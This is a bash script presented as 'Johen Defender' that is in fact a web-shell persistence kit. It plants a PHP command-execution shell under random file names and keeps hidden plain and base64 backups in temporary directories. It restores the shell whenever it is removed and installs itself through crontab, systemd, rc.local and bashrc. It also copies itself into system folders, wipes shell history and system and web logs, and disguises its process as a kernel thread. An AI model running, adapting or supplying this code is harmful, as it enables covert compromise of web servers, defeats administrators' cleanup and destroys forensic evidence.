#!/bin/bash

# ============================================
# JOHEN DEFENDER - FULL EDITION
# All features from original + new enhancements
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Random strings
RAND1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
RAND2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
RAND3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

# Backup locations (lebih banyak dari versi baru)
BACKUP_DIRS=(
    "/tmp/.$RAND1"
    "/dev/shm/.$RAND2"
    "/var/tmp/.$RAND3"
    "/tmp/.systemd-$RAND1"
    "/dev/shm/.cache-$RAND2"
    "/tmp/.dbus-$RAND1"
    "/var/tmp/.systemd-private-$RAND3"
)

BACKUP_NAMES=(
    ".dbus"
    ".X11-unix"
    ".systemd-logind"
    ".pulse-$RAND1"
    ".gconf-$RAND2"
    ".config-$RAND1"
    ".update-$RAND2"
)

LOG_FILE="/dev/shm/.system-$RAND1.log"
DEFAULT_SHELL='<?php system($_GET["cmd"]); ?>'
HIDE_PROCESS=true

# Warna output
print_status() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $1"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_error() { echo -e "${RED}[!] $1${NC}"; }
print_info() { echo -e "${CYAN}[i] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[⚠] $1${NC}"; }

# Banner
show_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════╗"
    echo "║     JOHEN DEFENDER - FULL EDITION         ║"
    echo "║     All Features + Auto Random            ║"
    echo "╚═══════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Generate random shell names
generate_shell_names() {
    local names=()
    for i in {1..5}; do
        local rand_name=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
        names+=("${rand_name}.php")
    done
    echo "${names[@]}"
}

# Setup directories
setup_directories() {
    for dir in "${BACKUP_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        chmod 755 "$dir" 2>/dev/null
    done
    print_success "Directories created (${#BACKUP_DIRS[@]} locations)"
}

# Create multi backups
create_backups() {
    local source_content="$1"
    
    local idx=0
    for dir in "${BACKUP_DIRS[@]}"; do
        local backup_file="$dir/${BACKUP_NAMES[$idx]}"
        echo "$source_content" > "$backup_file" 2>/dev/null
        chmod 644 "$backup_file" 2>/dev/null
        
        # Encoded backup
        echo "$source_content" | base64 > "$dir/.log" 2>/dev/null
        echo "$source_content" | base64 > "$dir/.cache" 2>/dev/null
        
        ((idx++))
    done
    
    print_success "Backups created in ${#BACKUP_DIRS[@]} locations"
}

# Restore from any backup
restore_shell() {
    local target="$1"
    
    for dir in "${BACKUP_DIRS[@]}"; do
        for name in "${BACKUP_NAMES[@]}"; do
            local backup_file="$dir/$name"
            if [ -f "$backup_file" ]; then
                cp "$backup_file" "$target" 2>/dev/null
                chmod 444 "$target" 2>/dev/null
                echo "[$(date)] RESTORED: $target from $backup_file" >> "$LOG_FILE"
                return 0
            fi
        done
        
        if [ -f "$dir/.log" ]; then
            cat "$dir/.log" | base64 -d > "$target" 2>/dev/null
            chmod 444 "$target" 2>/dev/null
            echo "[$(date)] RESTORED: $target from encoded" >> "$LOG_FILE"
            return 0
        fi
    done
    
    return 1
}

# Monitor file with checksum
monitor_file() {
    local file="$1"
    local checksum_file="/tmp/.cs_$(echo "$file" | md5sum | cut -d' ' -f1)"
    
    [ -f "$file" ] && md5sum "$file" 2>/dev/null | cut -d' ' -f1 > "$checksum_file"
    
    while true; do
        if [ ! -f "$file" ]; then
            print_status "File missing: $file"
            restore_shell "$file"
        else
            local curr_cs=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
            local orig_cs=$(cat "$checksum_file" 2>/dev/null)
            
            if [ "$curr_cs" != "$orig_cs" ] && [ -n "$orig_cs" ]; then
                print_status "File modified: $file"
                restore_shell "$file"
                md5sum "$file" | cut -d' ' -f1 > "$checksum_file"
            fi
        fi
        
        chmod 444 "$file" 2>/dev/null
        sleep 3
    done
}

# WATCHDOG - Auto restart if killed (FITUR LENGKAP DARI ORIGINAL)
watchdog() {
    local script="$1"
    while true; do
        if ! pgrep -f "$script" | grep -v $$ > /dev/null 2>&1; then
            print_status "Watchdog: Process died, restarting..."
            nohup "$script" > /dev/null 2>&1 &
        fi
        sleep 10
    done
}

# Install crontab
install_crontab() {
    local cmd="$1"
    local current_cron=$(crontab -l 2>/dev/null)
    echo "$current_cron" | grep -q "$cmd" && return 0
    
    (
        echo "$current_cron"
        echo "# System update $(date +%s)"
        echo "@reboot $cmd > /dev/null 2>&1"
        echo "*/3 * * * * $cmd > /dev/null 2>&1"
        echo "*/15 * * * * $cmd > /dev/null 2>&1"
        echo "@hourly $cmd > /dev/null 2>&1"
    ) | crontab - 2>/dev/null
    
    print_success "Crontab persistence installed"
}

# Install systemd (if available)
install_systemd() {
    local script_path="$1"
    local service_name="systemd-${RAND1}.service"
    
    if command -v systemctl &>/dev/null && [ -w "/etc/systemd/system" ]; then
        cat > "/etc/systemd/system/$service_name" << EOF
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=$script_path
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null
        systemctl enable "$service_name" 2>/dev/null
        systemctl start "$service_name" 2>/dev/null
        print_success "Systemd persistence installed"
    fi
}

# Install rc.local
install_rclocal() {
    local script_path="$1"
    if [ -w "/etc/rc.local" ]; then
        sed -i "s/exit 0/$script_path \&\nexit 0/" /etc/rc.local 2>/dev/null
        grep -q "$script_path" /etc/rc.local || echo "$script_path &" >> /etc/rc.local
        print_success "rc.local persistence installed"
    fi
}

# Install bashrc
install_bashrc() {
    local script_path="$1"
    local bashrc_files=("$HOME/.bashrc" "/root/.bashrc" "$HOME/.bash_profile")
    
    for bashrc in "${bashrc_files[@]}"; do
        if [ -f "$bashrc" ] && [ -w "$bashrc" ]; then
            grep -q "$script_path" "$bashrc" || echo "$script_path &" >> "$bashrc"
        fi
    done
    print_success "bashrc persistence installed"
}

# Self replicate ke system binary (FITUR DARI ORIGINAL)
self_replicate() {
    local script_path="$1"
    local target_dir="/usr/lib/systemd"
    local target_bin="$target_dir/systemd-logind-$RAND1"
    
    if [ -w "/usr/lib/systemd" ] || [ -w "/usr/lib" ]; then
        mkdir -p "$target_dir" 2>/dev/null
        cp "$script_path" "$target_bin" 2>/dev/null
        chmod +x "$target_bin" 2>/dev/null
        print_success "Self-replication complete"
    fi
}

# Clean logs (LENGKAP DARI ORIGINAL)
clean_logs() {
    while true; do
        # Clear history
        history -c 2>/dev/null
        > "$HOME/.bash_history" 2>/dev/null
        > "/root/.bash_history" 2>/dev/null
        
        # Clear system logs (if writable)
        [ -w "/var/log/auth.log" ] && > /var/log/auth.log 2>/dev/null
        [ -w "/var/log/syslog" ] && > /var/log/syslog 2>/dev/null
        [ -w "/var/log/apache2/access.log" ] && > /var/log/apache2/access.log 2>/dev/null
        [ -w "/var/log/nginx/access.log" ] && > /var/log/nginx/access.log 2>/dev/null
        [ -w "/var/log/lastlog" ] && echo > /var/log/lastlog 2>/dev/null
        
        sleep 3600  # Clean setiap jam
    done
}

# Hide process
hide_process() {
    if [ "$HIDE_PROCESS" = true ]; then
        local fake_names=(
            "[kworker/0:0]" "[kthreadd]" "[rcu_sched]"
            "[ksoftirqd/0]" "[migration/0]" "sshd: /var/run/sshd"
            "[systemd-logind]" "[dbus-daemon]" "[jbd2/sda1]"
        )
        local random_name=${fake_names[$RANDOM % ${#fake_names[@]}]}
        exec -a "$random_name" "$0" "$@" &
    fi
}

# Monitor all shell files
monitor_all() {
    local shells=("$@")
    for shell in "${shells[@]}"; do
        monitor_file "$shell" &
        print_status "Monitoring: $shell"
    done
}

# MAIN
main() {
    show_banner
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --shell) SHELL_CONTENT="$2"; shift 2 ;;
            --names) IFS=',' read -ra CUSTOM_NAMES <<< "$2"; shift 2 ;;
            --help) echo "Usage: $0 [--shell 'content'] [--names 'a.php,b.php']"; exit 0 ;;
            *) shift ;;
        esac
    done
    
    # Set default
    [ -z "$SHELL_CONTENT" ] && SHELL_CONTENT="$DEFAULT_SHELL"
    
    # Generate shell names
    if [ ${#CUSTOM_NAMES[@]} -eq 0 ]; then
        SHELL_NAMES=($(generate_shell_names))
    else
        SHELL_NAMES=("${CUSTOM_NAMES[@]}")
    fi
    
    print_info "Shell names: ${SHELL_NAMES[*]}"
    
    # Setup
    setup_directories
    create_backups "$SHELL_CONTENT"
    
    # Restore all shells
    for shell in "${SHELL_NAMES[@]}"; do
        restore_shell "$shell"
        print_success "Shell ready: $shell"
    done
    
    # Install persistence
    SCRIPT_PATH=$(realpath "$0")
    install_crontab "$SCRIPT_PATH"
    install_systemd "$SCRIPT_PATH"
    install_rclocal "$SCRIPT_PATH"
    install_bashrc "$SCRIPT_PATH"
    self_replicate "$SCRIPT_PATH"
    
    # Start all services
    monitor_all "${SHELL_NAMES[@]}"
    watchdog "$SCRIPT_PATH" &
    clean_logs &
    
    print_success "JOHEN DEFENDER FULL EDITION ACTIVE!"
    print_info "Monitoring ${#SHELL_NAMES[@]} shell files"
    print_info "Backups in ${#BACKUP_DIRS[@]} locations"
    print_info "Log: $LOG_FILE"
    echo ""
    print_warning "Test: rm -f ${SHELL_NAMES[0]} && sleep 3 && ls -la ${SHELL_NAMES[0]}"
    
    # Keep alive
    while true; do sleep 60; done
}

# Check running
if pgrep -f "johen.sh" | grep -v $$ > /dev/null; then
    print_error "Already running"
    exit 1
fi

hide_process
main "$@"
